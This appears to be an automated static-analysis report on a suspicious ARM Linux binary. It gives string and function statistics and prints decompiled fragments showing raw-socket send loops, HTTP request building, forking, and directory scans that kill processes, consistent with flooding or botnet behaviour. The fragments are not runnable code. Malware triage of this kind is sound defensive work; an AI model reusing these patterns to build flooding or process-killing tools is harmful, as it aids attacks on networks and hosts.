=============================================================================
========	BINARY ID :958f22b17835be98360855234b01a97dcc6b8198==================================================
================================================================================
================================================================================
========	STRINGS SUMMARY : =====================================================
================================================================================
TOTAL STRINGS COUNT :272
SUPSCPECTED LINES COUNT :12
SUPSCPECTED STRINGS COUNT (DISTINCT) :10
SUPSCPECTED STRINGS WEIGHT :40
SUSPECT STRING SCORE : [40 / 150] 26%
USER AGENTS STRINGS COUNT :0
STATIC IPs STRINGS COUNT :0
DYNAMIC IPs STRINGS COUNT :0
================================================================================
========	STRINGS DETAILS : =====================================================
================================================================================
================================================================================
========	SUSPECTED STRINGS : =====================================================
================================================================================
connect
getpid
socket
kill
bind
inet_addr
fork
getppid
sigprocmask
 HTTP/1.1\r\nUser-Agent: 
\r\nHost: 
http
================================================================================
========	USER AGENTS STRINGS : =====================================================
================================================================================
================================================================================
========	STATIC IP ADRESSES : =====================================================
================================================================================
================================================================================
========	DYNAMIC IP MASKS : =====================================================
================================================================================
================================================================================
========	/proc FOLDER ACCESS : =====================================================
================================================================================
================================================================================
========	HISTORY TEMPERING : =====================================================
================================================================================
================================================================================
========	AUTOINSTALL COMMANDS : =====================================================
================================================================================
================================================================================
========	FUNCTIONS SUMMARY : =====================================================
================================================================================
+++TOTAL FILE LINES			: 54632
+++TOTAL FUNCTIONS 			:115
+++LINES PER FUNCTION RATIO 	: 475.060869565217
+++SUSPECTED LINES COUNT 	: 708
+++SUSPECTED LINES RATIO 	: 1.29594376921951
================================================================================
========	WHILES SUMMARY : =====================================================
================================================================================
+++TOTAL FILE LINES				: 54632
+++WHILE (TRUE) LINES			: 8924
+++WHILE (TRUE) LINES RATION		:16.334748865134%
+++WHILE (TRUE) LOOPS COUNT		: 81
================================================================================
========	SYSTEM FILES SUMMARY : ================================================
================================================================================
================================================================================
========	IP PATTERNS SUMMARY : =================================================
================================================================================
================================================================================
========	SYSTEM CALLS SUMMARY : ================================================
================================================================================
================================================================================
========	FUNCTIONS LIST : =======================================================
================================================================================
FUNCTION_NAME                                     |ARGS|LENGH   |SUSPCET_INSTRC|WHILE_INSTRC|
----------------------------------------------------------------------------------------------
function_109d0                                    |1   |2535    |119           |1900        |
----------------------------------------------------------------------------------------------
function_95f0                                     |4   |2169    |65            |1711        |
----------------------------------------------------------------------------------------------
function_fdfc                                     |2   |788     |56            |294         |
----------------------------------------------------------------------------------------------
function_e9b8                                     |5   |1058    |52            |399         |
----------------------------------------------------------------------------------------------
function_8fdc                                     |4   |1589    |48            |859         |
----------------------------------------------------------------------------------------------
function_f2a8                                     |1   |1029    |38            |533         |
----------------------------------------------------------------------------------------------
function_c288                                     |5   |757     |33            |333         |
----------------------------------------------------------------------------------------------
function_f828                                     |1   |557     |23            |165         |
----------------------------------------------------------------------------------------------
function_daec                                     |5   |508     |17            |51          |
----------------------------------------------------------------------------------------------
function_de10                                     |5   |627     |14            |189         |
----------------------------------------------------------------------------------------------
function_d370                                     |5   |651     |12            |232         |
----------------------------------------------------------------------------------------------
function_cbb4                                     |5   |664     |12            |242         |
----------------------------------------------------------------------------------------------
function_b3a8                                     |5   |633     |11            |218         |
----------------------------------------------------------------------------------------------
function_bb50                                     |5   |629     |11            |214         |
----------------------------------------------------------------------------------------------
function_fba0                                     |1   |407     |11            |0           |
----------------------------------------------------------------------------------------------
function_e4b8                                     |5   |544     |9             |103         |
----------------------------------------------------------------------------------------------
function_13230                                    |3   |567     |8             |70          |
----------------------------------------------------------------------------------------------
function_1060c                                    |1   |367     |7             |0           |
----------------------------------------------------------------------------------------------
function_12ff4                                    |0   |381     |7             |0           |
----------------------------------------------------------------------------------------------
function_fd10                                     |1   |397     |5             |5           |
----------------------------------------------------------------------------------------------
function_1311c                                    |2   |511     |5             |40          |
----------------------------------------------------------------------------------------------
__umodsi3                                         |2   |764     |5             |354         |
----------------------------------------------------------------------------------------------
function_131a0                                    |3   |578     |5             |40          |
----------------------------------------------------------------------------------------------
function_10748                                    |0   |387     |5             |0           |
----------------------------------------------------------------------------------------------
__modsi3                                          |2   |829     |5             |380         |
----------------------------------------------------------------------------------------------
__udivsi3                                         |2   |724     |5             |212         |
----------------------------------------------------------------------------------------------
function_1081c                                    |3   |472     |4             |70          |
----------------------------------------------------------------------------------------------
function_8f00                                     |5   |408     |4             |16          |
----------------------------------------------------------------------------------------------
function_12e68                                    |2   |598     |4             |147         |
----------------------------------------------------------------------------------------------
function_13090                                    |3   |460     |3             |48          |
----------------------------------------------------------------------------------------------
function_12d64                                    |2   |420     |3             |24          |
----------------------------------------------------------------------------------------------
function_8e9c                                     |5   |398     |2             |15          |
----------------------------------------------------------------------------------------------
_accept                                           |4   |366     |2             |0           |
----------------------------------------------------------------------------------------------
_closedir                                         |2   |366     |2             |0           |
----------------------------------------------------------------------------------------------
_send                                             |4   |366     |2             |0           |
----------------------------------------------------------------------------------------------
_sendto                                           |7   |366     |2             |0           |
----------------------------------------------------------------------------------------------
_getsockopt                                       |6   |366     |2             |0           |
----------------------------------------------------------------------------------------------
_sigprocmask                                      |5   |366     |2             |0           |
----------------------------------------------------------------------------------------------
_setsockopt                                       |5   |366     |2             |0           |
----------------------------------------------------------------------------------------------
_getsockname                                      |4   |366     |2             |0           |
----------------------------------------------------------------------------------------------
_kill                                             |2   |366     |2             |0           |
----------------------------------------------------------------------------------------------
_listen                                           |2   |366     |2             |0           |
----------------------------------------------------------------------------------------------
_getppid                                          |0   |366     |2             |0           |
----------------------------------------------------------------------------------------------
_open                                             |3   |366     |2             |0           |
----------------------------------------------------------------------------------------------
_fork                                             |0   |366     |2             |0           |
----------------------------------------------------------------------------------------------
_recv                                             |4   |366     |2             |0           |
----------------------------------------------------------------------------------------------
_socket                                           |3   |366     |2             |0           |
----------------------------------------------------------------------------------------------
function_12e00                                    |4   |395     |2             |20          |
----------------------------------------------------------------------------------------------
_inet_addr                                        |1   |366     |2             |0           |
----------------------------------------------------------------------------------------------
function_8f6c                                     |4   |408     |2             |16          |
----------------------------------------------------------------------------------------------
_recvfrom                                         |8   |366     |2             |0           |
----------------------------------------------------------------------------------------------
function_10734                                    |1   |373     |2             |0           |
----------------------------------------------------------------------------------------------
_close                                            |1   |366     |2             |0           |
----------------------------------------------------------------------------------------------
function_f294                                     |1   |373     |2             |0           |
----------------------------------------------------------------------------------------------
_connect                                          |4   |366     |2             |0           |
----------------------------------------------------------------------------------------------
_getpid                                           |0   |366     |2             |0           |
----------------------------------------------------------------------------------------------
function_12f94                                    |3   |394     |2             |24          |
----------------------------------------------------------------------------------------------
function_fb34                                     |2   |366     |1             |0           |
----------------------------------------------------------------------------------------------
function_12340                                    |4   |496     |1             |0           |
----------------------------------------------------------------------------------------------
__aeabi_uidivmod                                  |2   |366     |1             |0           |
----------------------------------------------------------------------------------------------
function_12d3c                                    |1   |379     |1             |0           |
----------------------------------------------------------------------------------------------
__aeabi_ldiv0                                     |0   |367     |1             |0           |
----------------------------------------------------------------------------------------------
function_121a4                                    |2   |377     |1             |0           |
----------------------------------------------------------------------------------------------
function_121d0                                    |1   |406     |1             |0           |
----------------------------------------------------------------------------------------------
function_105b4                                    |0   |372     |1             |0           |
----------------------------------------------------------------------------------------------
_sigemptyset                                      |2   |366     |1             |0           |
----------------------------------------------------------------------------------------------
function_92b8                                     |1   |407     |1             |0           |
----------------------------------------------------------------------------------------------
function_8e58                                     |0   |367     |1             |0           |
----------------------------------------------------------------------------------------------
_write                                            |3   |366     |1             |0           |
----------------------------------------------------------------------------------------------
function_8e00                                     |0   |371     |1             |0           |
----------------------------------------------------------------------------------------------
function_13648                                    |0   |368     |1             |0           |
----------------------------------------------------------------------------------------------
function_fb4c                                     |0   |375     |1             |0           |
----------------------------------------------------------------------------------------------
function_f188                                     |2   |405     |1             |0           |
----------------------------------------------------------------------------------------------
_clock                                            |0   |366     |1             |0           |
----------------------------------------------------------------------------------------------
function_13640                                    |0   |367     |1             |0           |
----------------------------------------------------------------------------------------------
_bind                                             |4   |366     |1             |0           |
----------------------------------------------------------------------------------------------
__start                                           |2   |368     |1             |0           |
----------------------------------------------------------------------------------------------
function_f1e4                                     |4   |436     |1             |0           |
----------------------------------------------------------------------------------------------
function_1360c                                    |1   |382     |1             |0           |
----------------------------------------------------------------------------------------------
function_8df4                                     |1   |373     |1             |0           |
----------------------------------------------------------------------------------------------
_prctl                                            |5   |366     |1             |0           |
----------------------------------------------------------------------------------------------
function_8d80                                     |0   |387     |1             |0           |
----------------------------------------------------------------------------------------------
function_12db8                                    |3   |378     |1             |0           |
----------------------------------------------------------------------------------------------
function_12ddc                                    |2   |379     |1             |0           |
----------------------------------------------------------------------------------------------
_fcntl                                            |2   |366     |1             |0           |
----------------------------------------------------------------------------------------------
function_8b08                                     |0   |367     |1             |0           |
----------------------------------------------------------------------------------------------
___uClibc_main                                    |7   |366     |1             |0           |
----------------------------------------------------------------------------------------------
_read                                             |3   |366     |1             |0           |
----------------------------------------------------------------------------------------------
_ioctl                                            |2   |366     |1             |0           |
----------------------------------------------------------------------------------------------
__data_start                                      |2   |372     |1             |0           |
----------------------------------------------------------------------------------------------
function_8b20                                     |1   |374     |1             |0           |
----------------------------------------------------------------------------------------------
_time                                             |1   |366     |1             |0           |
----------------------------------------------------------------------------------------------
function_10668                                    |2   |386     |1             |0           |
----------------------------------------------------------------------------------------------
_select                                           |9   |366     |1             |0           |
----------------------------------------------------------------------------------------------
function_12288                                    |1   |406     |1             |0           |
----------------------------------------------------------------------------------------------
_sigaddset                                        |3   |366     |1             |0           |
----------------------------------------------------------------------------------------------
function_f180                                     |2   |374     |1             |0           |
----------------------------------------------------------------------------------------------
*                                                 |0   |366     |1             |0           |
----------------------------------------------------------------------------------------------
_readlink                                         |4   |366     |1             |0           |
----------------------------------------------------------------------------------------------
_sleep                                            |1   |366     |1             |0           |
----------------------------------------------------------------------------------------------
_setsid                                           |0   |366     |1             |0           |
----------------------------------------------------------------------------------------------
_memset                                           |3   |0       |0             |0           |
----------------------------------------------------------------------------------------------
_realloc                                          |2   |0       |0             |0           |
----------------------------------------------------------------------------------------------
__dirstream                                       |2   |0       |0             |0           |
----------------------------------------------------------------------------------------------
_calloc                                           |2   |0       |0             |0           |
----------------------------------------------------------------------------------------------
_malloc                                           |1   |0       |0             |0           |
----------------------------------------------------------------------------------------------
___errno_location                                 |0   |0       |0             |0           |
----------------------------------------------------------------------------------------------
_abort                                            |0   |0       |0             |0           |
----------------------------------------------------------------------------------------------
_strcpy                                           |3   |0       |0             |0           |
----------------------------------------------------------------------------------------------
_memmove                                          |4   |0       |0             |0           |
----------------------------------------------------------------------------------------------
dirent                                            |3   |0       |0             |0           |
----------------------------------------------------------------------------------------------
_memcpy                                           |4   |0       |0             |0           |
----------------------------------------------------------------------------------------------
sig,                                              |1   |0       |0             |0           |
----------------------------------------------------------------------------------------------
_free                                             |1   |0       |0             |0           |
----------------------------------------------------------------------------------------------
_exit                                             |1   |0       |0             |0           |
----------------------------------------------------------------------------------------------
================================================================================
========	FUNCTIONS SUSPECTED INSTRUNCTIONS : ===================================
================================================================================
=================FUNCTION : function_109d0 ===================
++++++++ FUNCTION START 40300
++++++++ FUNCTION END 42835
++++++++ FUNCTION LENGTH 2535
    struct sockaddr * v143;
    int32_t result = fork(); // 0x109dc
    int32_t sock;
    while (true) {
            int32_t sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); // 0x10a9c
            sock = sock_fd;
            if (sock_fd == -1) {
            fcntl(sock_fd, F_GETFL);
            fcntl(sock_fd, F_SETFL);
            if (setsockopt(sock, status, 3, &status, 4) != 0) {
                close(sock);
            while (true) {
                    while (true) {
                        while (true) {
                while (true) {
                    uint32_t v371 = recvfrom(sock, &buf, 1514, MSG_NOSIGNAL, NULL, NULL); // 0x110f8
                        while (true) {
                                close(fd);
                        while (true) {
                            int32_t sock18; // 0x11484
                            if (sock18 != -1) {
                                if ((v402 >> sock18 % 32) % 2 == 0) {
                                    v400 = sock18;
                                            while (true) {
                                                while (true) {
                                                    int32_t sock2; // 0x11634
                                                    int32_t v412 = recv(sock2, (int32_t *)buf2, 256 - v411, MSG_NOSIGNAL); // 0x11644
                                                                    close(fd2);
                                                                while (true) {
                                                                        case 2: {
                                                                                while (true) {
                                                                                    while (true) {
                                                                                                                int32_t sock3; // 0x11f8c
                                                                                                                send(sock3, &buf3, 3, MSG_NOSIGNAL);
                                                                                                                            send(0x4000, (int32_t *)buf4, 3, MSG_NOSIGNAL);
                                                                                                            send(0x4000, (int32_t *)(int32_t)&buf5, 9, MSG_NOSIGNAL);
                                                                                                            while (true) {
                                                                                                                    case 2: {
                                                                                                                        while (true) {
                                                                                                                    case 3: {
                                                                                                                            while (true) {
                                                                                                                                    int32_t sock4; // 0x11804
                                                                                                                                    send(sock4, (int32_t *)buf6, (int32_t)length, MSG_NOSIGNAL);
                                                                                                                                    int32_t sock5; // 0x1181c
                                                                                                                                    send(sock5, (int32_t *)"\r\n", 2, MSG_NOSIGNAL);
                                                                                                                    case 4: {
                                                                                                                            while (true) {
                                                                                                                                    int32_t sock6; // 0x11894
                                                                                                                                    send(sock6, (int32_t *)buf7, (int32_t)length2, MSG_NOSIGNAL);
                                                                                                                                    int32_t sock7; // 0x118ac
                                                                                                                                    send(sock7, (int32_t *)"\r\n", 2, MSG_NOSIGNAL);
                                                                                                                    case 5: {
                                                                                                                            while (true) {
                                                                                                                                    int32_t sock8; // 0x1194c
                                                                                                                                    send(sock8, (int32_t *)buf8, (int32_t)length3, MSG_NOSIGNAL);
                                                                                                                                    int32_t sock9; // 0x11960
                                                                                                                                    send(sock9, (int32_t *)"\r\n", 2, MSG_NOSIGNAL);
                                                                                                                                while (true) {
                                                                                                                        while (true) {
                                                                                                                    case 6: {
                                                                                                                        while (true) {
                                                                                                                            int32_t sock10; // 0x11ab8
                                                                                                                            send(sock10, (int32_t *)buf9, length4, MSG_NOSIGNAL);
                                                                                                                            int32_t sock11; // 0x11acc
                                                                                                                            send(sock11, (int32_t *)"\r\n", 2, MSG_NOSIGNAL);
                                                                                                                    case 7: {
                                                                                                                        while (true) {
                                                                                                                            int32_t sock12; // 0x11c20
                                                                                                                            send(sock12, (int32_t *)buf10, length4, MSG_NOSIGNAL);
                                                                                                                            int32_t sock13; // 0x11c34
                                                                                                                            send(sock13, (int32_t *)"\r\n", 2, MSG_NOSIGNAL);
                                                                                                                    case 8: {
                                                                                                                        while (true) {
                                                                                                                            int32_t sock14; // 0x11b6c
                                                                                                                            send(sock14, (int32_t *)buf11, (int32_t)length3, MSG_NOSIGNAL);
                                                                                                                            int32_t sock15; // 0x11b80
                                                                                                                            send(sock15, (int32_t *)"\r\n", 2, MSG_NOSIGNAL);
                                                                                                                    case 9: {
                                                                                                                        while (true) {
                                                                                                                            int32_t sock16; // 0x11d7c
                                                                                                                            send(sock16, (int32_t *)buf12, (int32_t)length3, MSG_NOSIGNAL);
                                                                                                                            int32_t sock17; // 0x11d90
                                                                                                                            send(sock17, (int32_t *)"\r\n", 2, MSG_NOSIGNAL);
                                                                                                                    case 10: {
                                                                                                                            int32_t v556 = fork(); // 0x11ee4
                                                                                                                                    int32_t sock_fd2 = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0x1203c
                                                                                                                                    t = sock_fd2;
                                                                                                                                    if (sock_fd2 == -1) {
                                                                                                                                    if (connect(t, (struct sockaddr *)&addr, 16) == -1) {
                                                                                                                                        close(t);
                                                                                                                                    send(t, (int32_t *)&length3, 1, MSG_NOSIGNAL);
                                                                                                                                    send(t, &length4, 4, MSG_NOSIGNAL);
                                                                                                                                    send(t, &buf13, 2, MSG_NOSIGNAL);
                                                                                                                                    send(t, (int32_t *)(v559 + 12), 1, MSG_NOSIGNAL);
                                                                                                                                    send(t, (int32_t *)buf14, (int32_t)length5, MSG_NOSIGNAL);
                                                                                                                                    send(t, (int32_t *)(v559 + 13), 1, MSG_NOSIGNAL);
                                                                                                                                    send(t, (int32_t *)buf15, (int32_t)length6, MSG_NOSIGNAL);
                                                                                                                                    close(t);
                                                                                                                            close(fd3);
                                                                                                                            close(fd4);
                                                                                    while (true) {
                                                                        case 3: {
                                                                        case 4: {
                                                                        case 5: {
                                                                        case 6: {
                                                                        case 7: {
                                                                        case 8: {
                                                                        case 9: {
                                                                        case 10: {
                                                        close(fd2);
                                                        while (true) {
                                    if ((length4 || getsockopt(sock18, SO_DEBUG, 4, &length4, (int32_t *)&length3)) == 0) {
                                            while (true) {
                                        close(fd5);
                        while (true) {
                    sendto(sock, &message, 40, MSG_NOSIGNAL, (struct sockaddr *)&addr, 16);
                    while (true) {
        while (true) {
    while (true) {
=================FUNCTION : function_95f0 ===================
++++++++ FUNCTION START 24115
++++++++ FUNCTION END 26284
++++++++ FUNCTION LENGTH 2169
    struct sockaddr * v155;
    int32_t v360 = function_8e9c(fd, (int32_t *)t, 19, (int32_t)"GET", v359); // fp
                        while (true) {
                                    while (true) {
                                while (true) {
                                    while (true) {
                                while (true) {
                                                int32_t sock_fd = socket(AF_INET, SOCK_STREAM, protocol); // 0x9ab8
                                                dest_mem = sock_fd;
                                                fd = sock_fd;
                                                if (sock_fd != -1) {
                                                    fcntl(dest_mem, F_GETFL);
                                                    int32_t sock; // 0x9af8
                                                    setsockopt(sock, protocol, 8, &option_value, 4);
                                                    int32_t sock2; // 0x9b28
                                                    connect(sock2, (struct sockaddr *)&addr, 16);
                                        function_12d64((char *)v431, (int32_t)" HTTP/1.1\r\nUser-Agent: ");
                                        function_12d64((char *)v433, (int32_t)"\r\nHost: ");
                                                int32_t sock3; // 0xa0f4
                                                send(sock3, (int32_t *)buf, function_12d3c(v403), MSG_NOSIGNAL);
                                                close(fd2);
                                                        close(fd3);
    while (true) {
        uint32_t sock8; // 0x9c7c
        if (sock8 != -1) {
            if ((v479 >> sock8 % 32) % 2 == 0) {
                v478 = sock8;
                        int32_t sock4; // 0xa208
                        int32_t v485 = recv(sock4, &buf2, 0x2800, MSG_PEEK | MSG_NOSIGNAL); // 0xa214
                            close(fd4);
                            while (true) {
                                            while (true) {
                                                    while (true) {
                                                    while (true) {
                                        if (function_12e00(t, v545, (int32_t)"http", 4) == 4) {
                                                    while (true) {
                                                if (function_1311c((char *)v559, (int32_t)"POST") == 0) {
                                                    if (function_1311c((char *)v559, (int32_t)"GET") == 0) {
                                                        int32_t sock5; // 0xad24
                                                        recv(sock5, &buf2, length, MSG_NOSIGNAL);
                                                if (function_13090((char *)fd, function_12d3c((char *)v576), (int32_t)"url=") == -1) {
                                                    int32_t v581 = option_value + function_13090((char *)v580, function_12d3c((char *)v580), (int32_t)"url="); // 0xac20
                                                    while (true) {
                                                if (function_13090((char *)t, function_12d3c((char *)v588), (int32_t)"http") == 4) {
                                                            while (true) {
                                                        memcpy((int32_t *)(v362 + 1431), (int32_t *)"GET", 4);
                                                dest_mem = (int32_t)memcpy((int32_t *)v601, (int32_t *)"GET", 4);
                                if (function_1311c((char *)v559, (int32_t)"POST") == 0) {
                            while (true) {
                            while (true) {
                                int32_t sock6; // 0xa860
                                int32_t v607 = recv(sock6, (int32_t *)(v373 + v606), 1024 - v606, MSG_NOSIGNAL); // 0xa870
                                    close(fd5);
                                        while (true) {
                                        while (true) {
                            while (true) {
                            while (true) {
                                int32_t sock7; // 0xaa54
                                int32_t v649 = recv(sock7, &buf2, 0x2800, MSG_NOSIGNAL); // 0xaa60
                                            close(fd6);
                                close(fd6);
                            while (true) {
                int32_t v652 = option_value2 | getsockopt(sock8, SO_DEBUG, 4, &option_value2, &option_len); // 0x9cf0
                close(fd7);
    while (true) {
=================FUNCTION : function_fdfc ===================
++++++++ FUNCTION START 37134
++++++++ FUNCTION END 37922
++++++++ FUNCTION LENGTH 788
    sigprocmask(how, (struct _TYPEDEF_sigset_t *)&set, (struct _TYPEDEF_sigset_t *)how);
    struct sockaddr * addr;
        if (fork() > fd2) {
        close(fd2);
        close(1);
        v364 = close(2);
        while (true) {
                while (true) {
                int32_t sock2;
                    while (true) {
                    v390 = sock2;
                    int32_t sock;
                    if (sock == -1) {
                        int32_t sock_fd = socket(AF_INET, SOCK_STREAM, protocol); // 0x10308
                        int32_t fd3 = sock_fd; // r5
                        if (sock_fd != -1) {
                            fcntl(sock_fd, F_GETFL);
                            connect(sock, (struct sockaddr *)&addr, 16);
                    uint32_t v395 = sock; // 0x10218
                    int32_t v399 = sock; // 0x10110
                    int32_t v400 = sock2; // 0x10134
                    if (sock2 < v399) {
                                send(sock, (int32_t *)&buf2, 2, MSG_NOSIGNAL);
                        if (sock2 != -1) {
                            if ((v403 >> sock2 % 32) % 2 != 0) {
                                int32_t accepted_sock_fd = accept(sock2, (struct sockaddr *)&addr2, &addr_len); // 0x10400
                                function_f294(function_10734(accepted_sock_fd));
                                kill(-v363, SIGKILL);
                                    kill(pid, SIGKILL);
                        uint32_t sock3 = sock; // 0x10244
                            if (sock3 != -1) {
                                if ((v408 >> sock3 % 32) % 2 != 0) {
                                    int32_t v409 = recv(sock, (int32_t *)&buf2, 2, MSG_PEEK | MSG_NOSIGNAL); // 0x102a4
                                                __pseudo_cond_branch(sock != -1, (int32_t)&v407);
                                                sock = -1;
                                            recv(sock, (int32_t *)&buf2, 2, MSG_NOSIGNAL);
                                                close(sock);
                                                int32_t v413 = recv(sock, &buf3, length, MSG_PEEK | MSG_NOSIGNAL); // 0x104f4
                                                recv(sock, (int32_t *)&buf2, 2, MSG_NOSIGNAL);
                                                recv(sock, &buf3, length2, MSG_NOSIGNAL);
                            if ((v418 >> sock3 % 32) % 2 == 0) {
                                __pseudo_cond_branch(sock3 != -1, (int32_t)&v407);
                                getsockopt(sock3, SO_DEBUG, 4, &addr_len, &option_len);
                                    int32_t sock4; // 0x10458
                                    send(sock4, &buf4, 4, MSG_NOSIGNAL);
                                    int32_t sock5; // 0x10468
                                    send(sock5, (int32_t *)&buf2, 1, MSG_NOSIGNAL);
                                    int32_t sock6; // 0x10484
                                    send(sock6, &buf5, length3, MSG_NOSIGNAL);
                                    close(sock);
                v390 = sock2;
    if (fork() > fd2) {
    close(fd2);
    close(1);
    v364 = close(2);
    while (true) {
=================FUNCTION : function_e9b8 ===================
++++++++ FUNCTION START 31324
++++++++ FUNCTION END 32382
++++++++ FUNCTION LENGTH 1058
    struct sockaddr * v161;
    fd = open((char *)function_121a4(37, (int32_t *)oflag), oflag);
    int32_t sock_fd; // 0xec4c
            case 0: {
            case 1: {
            case -2: {
            case -1: {
        sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if (sock_fd == -1) {
            return sock_fd;
        if (setsockopt(sock_fd, 0, 3, &option_value, 4) == -1) {
            result2 = close(sock_fd);
            while (true) {
    close(fd);
            while (true) {
                                inet_addr((char *)&cp);
                                sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
                                if (sock_fd == -1) {
                                    return sock_fd;
                                if (setsockopt(sock_fd, 0, 3, &option_value, 4) == -1) {
                                    result2 = close(sock_fd);
                                    while (true) {
                                            while (true) {
                                    while (true) {
                                                        sendto(sock_fd, (int32_t *)fd, v406 + 47, MSG_NOSIGNAL, (struct sockaddr *)(a3 + 24 * option_value), 16);
                            inet_addr((char *)&cp);
                            sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
                            if (sock_fd == -1) {
                                return sock_fd;
                            if (setsockopt(sock_fd, 0, 3, &option_value, 4) == -1) {
                                result2 = close(sock_fd);
                            while (true) {
                case 0: {
                case 1: {
                case -2: {
                case -1: {
            sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
            if (sock_fd == -1) {
                return sock_fd;
            if (setsockopt(sock_fd, 0, 3, &option_value, 4) == -1) {
                result2 = close(sock_fd);
                while (true) {
        case 0: {
        case 1: {
        case -2: {
        case -1: {
    sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock_fd == -1) {
        return sock_fd;
    if (setsockopt(sock_fd, 0, 3, &option_value, 4) == -1) {
        result2 = close(sock_fd);
        while (true) {
=================FUNCTION : function_8fdc ===================
++++++++ FUNCTION START 22113
++++++++ FUNCTION END 23702
++++++++ FUNCTION LENGTH 1589
    struct sockaddr * v160;
        while (true) {
                                        while (true) {
                                                v384 = fork();
                                                        while (true) {
                                                    free((int32_t *)v381);
                                                    while (true) {
                                                free((int32_t *)v381);
                                                while (true) {
                                                free((int32_t *)v381);
                                                while (true) {
                                            free((int32_t *)v381);
                                            while (true) {
                                free((int32_t *)v381);
                                while (true) {
                            free((int32_t *)v381);
                                while (true) {
                    v384 = fork();
                                while (true) {
                        free((int32_t *)v381);
                            while (true) {
                    free((int32_t *)v381);
                        while (true) {
                    free((int32_t *)v381);
                        while (true) {
                free((int32_t *)v381);
                    while (true) {
                            while (true) {
                                v384 = fork();
                                            while (true) {
                                    free((int32_t *)v381);
                                        while (true) {
                                free((int32_t *)v381);
                                    while (true) {
                    free((int32_t *)v381);
                        while (true) {
                free((int32_t *)v381);
                    while (true) {
        v384 = fork();
                    while (true) {
            free((int32_t *)v381);
                while (true) {
        free((int32_t *)v381);
            while (true) {
        free((int32_t *)v381);
            while (true) {
    free((int32_t *)v381);
        while (true) {
=================FUNCTION : function_f2a8 ===================
++++++++ FUNCTION START 33985
++++++++ FUNCTION END 35014
++++++++ FUNCTION LENGTH 1029
    struct sockaddr * v160;
    int32_t fd = open((char *)function_121a4(9, (int32_t *)oflag), oflag); // 0xf388
    struct __dirstream * dirp; // 0xf560
        close(fd2);
            dirp = opendir((char *)name);
                    while (true) {
                closedir((struct __dirstream *)fd2);
    while (true) {
                while (true) {
                            while (true) {
                                while (true) {
                                                    while (true) {
                                                close(fd2);
                                                dirp = opendir((char *)name);
                                                    while (true) {
                                                        while (true) {
                                                                        struct __dirstream * dirp2 = opendir((char *)&path); // 0xf65c
                                                                                while (true) {
                                                                                    while (true) {
                                                                                                    kill(function_12e68((char *)v406, 10), SIGKILL);
                                                                                                    struct dirent * v424 = readdir((struct __dirstream *)dirp3); // 0xf758
                                                                                            struct dirent * v425 = readdir((struct __dirstream *)dirp3); // 0xf66c
                                                                                    closedir((struct __dirstream *)dirp3);
                                                                                    v415 = readdir((struct __dirstream *)fd2);
                                                                                closedir((struct __dirstream *)dirp4);
                                                                            closedir((struct __dirstream *)dirp3);
                                                                            v415 = readdir((struct __dirstream *)fd2);
                                                                struct dirent * v435 = readdir((struct __dirstream *)fd2); // 0xf578
                                                        closedir((struct __dirstream *)fd2);
                                                closedir((struct __dirstream *)fd2);
                                close(fd2);
                                dirp = opendir((char *)name);
                                    while (true) {
                                closedir((struct __dirstream *)fd2);
    close(fd2);
        dirp = opendir((char *)name);
                while (true) {
            closedir((struct __dirstream *)fd2);
=================FUNCTION : function_c288 ===================
++++++++ FUNCTION START 27555
++++++++ FUNCTION END 28312
++++++++ FUNCTION LENGTH 757
    struct sockaddr * v161;
    int32_t sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); // 0xc47c
    if (sock_fd == -1) {
        return sock_fd;
    if (setsockopt(t, SO_TYPE, option_name, &option_value, (int32_t)&option_len) == -1) {
        result2 = close(sock_fd);
            while (true) {
                while (true) {
                    int32_t sock_fd2 = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0xc50c
                    t = sock_fd2;
                    if (sock_fd2 == -1) {
                        while (true) {
                            fcntl(sock_fd2, F_GETFL);
                                    connect(t, (struct sockaddr *)&addr, 16);
                                    while (true) {
                                        int32_t v399 = recvfrom(sock_fd, &buf, 256, MSG_NOSIGNAL, (struct sockaddr *)&addr2, &addr_len); // 0xc618
                                                            close(t);
                                                    while (true) {
                                                        sock_fd2 = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
                                                        v404 = sock_fd2;
                                                        v403 = sock_fd2 == -1;
                                                        t = sock_fd2;
                                                        if (sock_fd2 == -1) {
                                                    while (true) {
                                                            while (true) {
                                                                sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
                                    close(t);
                                    int32_t sock_fd3 = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0xc6a8
                                    t = sock_fd3;
                                    if (sock_fd3 == -1) {
                                    sock_fd2 = sock_fd3;
                while (true) {
        while (true) {
=================FUNCTION : function_f828 ===================
++++++++ FUNCTION START 35017
++++++++ FUNCTION END 35574
++++++++ FUNCTION LENGTH 557
    struct sockaddr * v158;
    int32_t result2 = fork(); // 0xf83c
        int32_t sock = 2; // bp-52
            int32_t sock_fd = socket(AF_INET, SOCK_STREAM, protocol); // 0xfafc
            if (sock_fd != -1) {
                bind((int32_t)&sock, (struct sockaddr *)16, 16);
                listen(sock_fd, 1);
        while (true) {
            struct __dirstream * v367 = opendir((char *)function_121a4(6, NULL)); // 0xf8e0
                struct dirent * v368 = readdir((struct __dirstream *)dirp); // 0xf8f822
                    while (true) {
                        while (true) {
                                    int32_t fd = open((char *)&path, O_RDONLY); // 0xfa04
                                        while (true) {
                                                close(time_val);
                                            v372 = readdir((struct __dirstream *)dirp);
                                        closedir((struct __dirstream *)dirp);
                                        struct dirent * v381 = readdir((struct __dirstream *)dirp); // 0xf974
                                    v372 = readdir((struct __dirstream *)dirp2);
                                v372 = readdir((struct __dirstream *)dirp2);
                            v372 = readdir((struct __dirstream *)dirp);
                        closedir((struct __dirstream *)dirp);
                closedir((struct __dirstream *)dirp);
=================FUNCTION : function_daec ===================
++++++++ FUNCTION START 29636
++++++++ FUNCTION END 30144
++++++++ FUNCTION LENGTH 508
    struct sockaddr * v161;
            int32_t sock; // 0xdd5c
            send(sock, (int32_t *)buf, length, MSG_NOSIGNAL);
                send(sock, (int32_t *)buf, length, MSG_NOSIGNAL);
        int32_t sock2; // 0xddec
        send(sock2, (int32_t *)buf2, length, MSG_NOSIGNAL);
